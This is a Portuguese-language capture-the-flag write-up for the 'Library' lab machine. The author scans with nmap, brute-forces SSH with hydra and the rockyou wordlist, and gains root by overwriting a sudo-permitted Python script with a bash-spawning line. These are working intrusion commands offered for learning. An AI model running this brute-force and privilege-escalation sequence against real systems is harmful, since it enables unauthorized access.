# Library
## Resumo
Objetivo Explorar o Blog e se tornar o user root.
Objetivo: Read "user.txt" and "root.txt"

## Recon

Recebi um IP da laboratorio e dando uma olhada na pagina web, notei que o usuario **meliodas** fez uma publicação no blog. Um fato curioso e que usuarios com nome de **www-data e root** fizeram comentarios.

Essas observaçoes me fizeram pensar que os usuarios são os mesmos da maquina... Então, quem esta no comando comanda?
```
sudo nmap $IP -T5 -sS
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
Interessante e simples. Vou investigar a Porta 80:
```
sudo nmap $IP -T5 -sC -sS -sV -p80

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to  Blog - Library Machine
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
```
### Flags:
-T5 = velocidade

-sS = sync varedura. É uma varedura leve, pois não completa o aberto de mãos de 3 vias.

-sV = Pedir para trazer a versao do serviço.

-p80 = Indica a porta a ser invetigada.

-sC = Script Padrao do nmap. [Ver nmap](https://nmap.org/nsedoc/categories/default.html)

### ---
Temos uma dica:
```robots.txt
/robots.txt
User-agent: rockyou
Disallow: /
```
### Analisando

Até agora lemos o blog e descobrimos que o usuario **meliodas** provavelmente e um usuario do sistema, assim comoo o root...

Temos uma porta ssh...

Temos uma referencia/dica no robots.txt...

Não tem como ser mais obvio? BruteForce!

## Acesso Inicial

```BASH
Utilizaremos o hydra:
hydra -l meliodas -P wordlist/rockyou.txt $IP ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-04 17:38:09
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 458 login tries (l:1/p:458), ~29 tries per task
[DATA] attacking ssh://$IP:22/
[22][ssh] host: $IP   login: meliodas   password: [REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-04 17:38:16
```
### Flags:
-l = usuario

-P = lista de palavras (wordlist)

ssh = tipo de ataque

### ---
Ok... now, ssh agora:
```BASH
ssh meliodas@$IP
```

Estamos dentro... E como usuario de permissões medias ainda kkkk.

## Priv Escalation 
```BASH
meliodas@ubuntu:~$ ls -l
total 8
-rw-r--r-- 1 root     root     353 Aug 23  2019 bak.py
-rw-rw-r-- 1 meliodas meliodas  33 Aug 23  2019 user.txt
meliodas@ubuntu:~$ id
uid=1000(meliodas) gid=1000(meliodas) groups=1000(meliodas),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
meliodas@ubuntu:~$
```
### Analisando
Somos meliodas...
Temos um script na nossa home com permisões de leitura e escrita...
Temos permissoes para execulta-lo como root:

    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py

### ---

```BASH
meliodas@ubuntu:~$ rm bak.py 
rm: remove write-protected regular file 'bak.py'? y
meliodas@ubuntu:~$ echo 'import pty;pty.spawn("/bin/bash");' > bak.py
meliodas@ubuntu:~$ chmod +x bak.py 
meliodas@ubuntu:~$ sudo /usr/bin/python3 /home/meliodas/bak.py
root@ubuntu:~# cat user.txt 
6d488**************3cb635f4ec
root@ubuntu:~# cat /root/root.txt
e8c8c******************88c617
root@ubuntu:~# 
```
Entao e isso. Removi o Script; escrevi um codigo python para o meu uso e capturei as flags;
### Liçoes aprendidas?
Cuidado com arquivos com permissoes fracas

Um reconhecimento bem feito poupa tempo

Ultilize logica ao pensar

Ferramentas: Nmap & hydra.
# Hack The Word !!!

